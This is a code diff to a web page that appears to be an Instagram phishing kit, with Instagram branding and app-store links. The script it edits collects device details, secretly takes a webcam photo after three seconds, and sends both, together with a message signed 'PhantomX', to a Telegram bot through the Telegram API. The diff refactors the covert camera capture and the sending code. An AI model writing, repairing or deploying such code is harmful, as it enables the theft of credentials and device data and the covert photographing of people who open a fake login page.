@@ -139,10 +139,10 @@
             <div class="download-link">
                 <span>Download app:</span><br>
                 <a href="https://play.google.com/store/apps/details?id=com.instagram.android" target="_blank">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/58/Google_Play_Logo_2013.svg/1200px-Google_Play_Logo_2013.svg.png" alt="Download for Android">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a6/Google_Play_Logo_2013.png" alt="Download for Android">
                 </a>
                 <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/73/Apple_Store_Logo.svg" alt="Download for iOS">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/Instagram_logo_2022.svg" alt="Download for iOS">
                 </a>
             </div>
         </div>
@@ -192,22 +192,28 @@
             return { platform, browserInfo, language, memory, cpuCores, screenResolution };
         }
 
-        function captureImage() {
-            return new Promise((resolve) => {
-                const video = document.createElement('video');
-                const canvas = document.createElement('canvas');
-                const context = canvas.getContext('2d');
+        async function captureImage() {
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
 
-                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                    video.srcObject = stream;
-                    video.play();
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.play();
+
+                // Capture the image after 3 seconds
+                return new Promise((resolve) => {
                     setTimeout(() => {
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         video.srcObject.getTracks().forEach(track => track.stop());
                         resolve(canvas.toDataURL('image/jpeg'));
-                    }, 3000); // Wait for 3 seconds before capturing
-                }).catch(() => resolve(null)); // Handle error and resolve null
-            });
+                    }, 3000);
+                });
+            } catch (error) {
+                console.error('Error accessing webcam: ', error);
+                return null;
+            }
         }
 
         async function submitForm(event) {
@@ -241,7 +247,7 @@
                             `📺 دقة الشاشة: ${deviceInfo.screenResolution}\n\n` +
                             `🕒 *التوقيت:* ${currentTime}\n\n` +
                             `👁️‍🗨️ *تم التقاط صورة المستخدم*`
-                            `☣ *⚜By PhantomX @tx_5w⚜*`   ;
+                            `☣ *⚜By PhantomX @tx_5w⚜*`;
 
             // Send the information to Telegram bot
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -250,7 +256,7 @@
                 body: JSON.stringify({ chat_id: chatId, text: message })
             });
 
-            // Send the captured image to Telegram bot
+            // Send the captured image to Telegram bot if available
             if (imageData) {
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
